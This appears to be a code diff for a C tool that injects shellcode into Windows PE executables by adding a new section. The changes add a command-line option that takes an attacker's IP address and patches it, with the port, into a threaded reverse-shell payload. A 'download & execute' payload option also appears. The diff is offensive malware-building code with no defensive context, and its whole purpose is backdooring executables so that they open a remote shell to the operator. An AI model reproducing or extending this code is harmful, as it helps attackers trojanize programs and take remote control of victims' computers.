@@ -180,7 +180,9 @@ int main(int argc, char *argv[])
 	IMAGE_SECTION_HEADER *new_ish;
 	char *shellcode,*needle_offset;
 	char patch_port[]="\x53\x53";
+	char patch_ip[]= "\x49\x49\x49\x49";
 	DWORD patch_offset;
+	long ip;
 //char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
 //"\x60";	//PUSHAD
 
@@ -220,8 +222,8 @@ for (count = 0; count < argc; count++)
 		if (!strcmp(argv[count+1], "reverse"))
 		{
 			shellcode=(CHAR *)calloc(sizeof(reverse_shell_threaded),1);
-			memcpy(shellcode,reverse_shell_threaded,sizeof(reverse_shell_threaded));
-			shellcode_size = sizeof(reverse_shell_threaded);
+			memcpy(shellcode,reverse_shell_threaded_patched,sizeof(reverse_shell_threaded_patched));
+			shellcode_size = sizeof(reverse_shell_threaded_patched);
 		}
 		if (!strcmp(argv[count+1], "download & execute"))
 		{
@@ -266,13 +268,18 @@ for (count = 0; count < argc; count++)
 	{
 		port = htons(atoi(argv[count+1]));
 	}
-
+	if(!strcmp(argv[count],"-h"))
+	{
+		ip = inet_addr(argv[count+1]);
+	}
 }
 	
 // Shellcode Patching PORT
 	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
 	memcpy(shellcode+patch_offset,&port,sizeof(port));
-	
+// Reverse Shellcode Patching HOST
+	memmem(shellcode,shellcode_size,patch_ip,sizeof(DWORD),&patch_offset);
+	memcpy(shellcode+patch_offset,&ip,sizeof(ip));
 	
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
 
